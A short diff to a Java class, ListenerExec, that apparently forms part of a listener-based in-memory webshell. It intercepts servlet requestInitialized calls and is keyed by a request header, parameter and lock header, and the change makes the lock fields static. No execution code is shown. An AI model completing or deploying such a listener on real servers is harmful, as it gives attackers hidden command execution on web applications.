@@ -18,8 +18,8 @@ import java.lang.reflect.Method;
 public class ListenerExec implements InvocationHandler {
     private static String HEADER;
     private static String PARAM;
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("requestInitialized")) {
